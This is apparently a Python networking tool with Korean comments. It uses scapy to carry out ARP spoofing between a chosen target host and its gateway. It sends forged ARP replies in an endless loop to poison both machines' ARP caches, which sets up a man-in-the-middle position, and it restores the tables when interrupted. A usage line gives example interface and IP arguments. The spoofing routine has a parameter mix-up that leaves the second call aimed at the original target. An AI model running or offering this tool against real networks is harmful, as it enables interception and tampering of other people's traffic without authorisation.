# -*- coding: utf-8 -*- 
import time
from scapy.all import send, srp, ARP, Ether

class ArpSpoofing :
    def __init__(self, interface, targetIp, gatewayIp) :
        self._interface = interface
        self._targetIp = targetIp
        self._gatewayIp = gatewayIp
    
    # arpSoofing을 시작한다.
    def startArpSpoofing(self) :
        g = '\033[92m'
        e = '\033[0m'
        count=0
        try : 
            while True :
                self._spoof(self._interface, self._targetIp, self._gatewayIp)
                self._spoof(self._interface, self._gatewayIp, self._targetIp)
                count+=1
                print(g+"[*] " + str(count) + "번째 ARP Spoofing (종료후 다시 복구할려면 Ctrl+C 입력)"+e)
                time.sleep(2)
        except KeyboardInterrupt :
            print(g+"[*] Ctrl+C가 감지됨. ARP 테이블을 다시 복구중..."+e)
            self._restore(self._interface, self._targetIp, self._gatewayIp)
            self._restore(self._interface, self._gatewayIp, self._targetIp)
            print(g+"[*] 복구가 완료됨 !"+e)

    # targetIp에게 SpoofIp로 자신을 속인다.    
    def _spoof(self, interface, targetIp, spoofIp) :
        target_mac = self._getMacAddress(interface, targetIp)
        send(ARP(op=2, pdst=self._targetIp, hwdst=target_mac, psrc=spoofIp), iface=interface, verbose=False)

    
    # 타겟IP에게 restoreIp의 제데로된 MAC주소를 보내서 다시 복구시킨다.
    def _restore(self, interface, targetIp, restoreIp) :
        target_mac = self._getMacAddress(interface, targetIp)
        restore_mac = self._getMacAddress(interface, restoreIp)
        send(ARP(op=2, pdst=targetIp, hwdst=target_mac, psrc=restoreIp, hwsrc=restore_mac), iface=interface, count=5, verbose=False)

    # 특정 Ip주소의 Mac주소를 얻는다.
    def _getMacAddress(self, interface, ipAddress) :
        f = '\033[91m'
        e = '\033[0m'
        while(True) :
            ans, uans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ipAddress), timeout=2, iface=interface, verbose=False)
            if(len(ans)) : break
            else : print(f+"[!] "+ipAddress+"에 대한 MAC 주소를 얻지못했습니다. 잠시후 다시 시도됩니다."+e)
        return ans[0][1].hwsrc

# 도움말을 출력한다.
def help() :
    print("nt.py -a 1 -i <Network InterFace> -t <TargetIpAddress> -g <GatewayIpAddress>")
    print("ex) nt.py -a 1 -i eth0 -t 192.168.111.3 -g 192.168.111.1")